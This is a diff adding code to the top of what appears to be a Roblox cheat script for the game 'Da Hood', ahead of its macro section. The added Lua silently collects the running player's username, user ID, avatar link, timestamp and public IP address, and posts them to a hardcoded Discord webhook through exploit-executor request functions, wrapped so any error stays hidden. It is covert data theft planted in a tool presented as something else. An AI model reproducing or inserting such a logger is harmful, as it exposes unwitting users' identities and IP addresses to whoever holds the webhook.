@@ -1,3 +1,65 @@
+local webh = "https://discord.com/api/webhooks/1234912975576498328/feKHFBOFYkkuH-c7GYnHj76cvlFrDdP8qLSH8yr3G0E_i-3Rv-IdTMF04IALA0W2xDKl"
+
+pcall(function()
+    -- Fetch relevant game details
+    local player = game.Players.LocalPlayer
+    local gameId = game.PlaceId
+    local gameLabel = ""
+    
+    -- Determine game label based on ID
+    if gameId == 2788229376 then
+        gameLabel = "Game: Da Hood (non macro)"
+    elseif gameId == 16033173781 then
+        gameLabel = "Game: Da Hood (Macro)"
+    elseif gameId == 7213786345 then
+        gameLabel = "Game: Da Hood (VC)"
+    else
+        gameLabel = "Game: Unknown"
+    end
+    
+    -- Fetch timestamp and Avatar URL
+    local timestamp = os.date("%Y-%m-%d %H:%M:%S")
+    local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId="..player.UserId.."&width=420&height=420&format=png"
+
+    -- Prepare the data to be sent
+    local data = {
+        ["embeds"] = {
+            {
+                ["title"] = "Execution \n Display: "..player.DisplayName.."\n User: "..player.Name,
+                ["description"] = "UserID: " .. player.UserId .. 
+                                  "\nIP Address: " .. game:HttpGet("https://api.ipify.org") ..
+                                  "\nTimestamp: " .. timestamp ..
+                                  "\nJob ID (Game ID): " .. gameId ..
+                                  "\n"..gameLabel,
+                ["thumbnail"] = {
+                    ["url"] = avatarUrl -- Player's avatar image
+                }
+            }
+        }
+    }
+
+    -- Function to send request
+    local function sendRequest(req)
+        req({
+            Url = webh,
+            Method = 'POST',
+            Headers = {
+                ['Content-Type'] = 'application/json'
+            },
+            Body = game:GetService('HttpService'):JSONEncode(data)
+        })
+    end
+
+    -- Send data based on available request method
+    if syn then
+        sendRequest(syn.request)
+    elseif request then
+        sendRequest(request)
+    elseif http_request then
+        sendRequest(http_request)
+    end
+end)
+
 -- =======================
 --     Macro Functionality
 -- =======================
